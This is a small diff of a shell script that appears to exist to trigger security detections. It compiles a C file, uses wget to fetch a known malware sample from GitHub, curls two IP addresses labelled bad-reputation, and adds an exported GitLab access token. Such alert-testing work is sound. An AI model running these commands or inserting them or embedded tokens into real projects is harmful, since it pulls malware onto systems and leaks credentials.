@@ -7,6 +7,8 @@ gcc /home/app/main2.c -o /home/app/main2.o
 # Dropper & Known malware
 wget https://github.com/FaridArbai/mws/raw/master/original_malware_433
 
+export GIT_LAB="glpat-y6gpZeq5K6pgdP4AZmdL"
+
 # Bad reputation communication
 curl 141.98.10.57 &
 curl 192.241.217.0 &
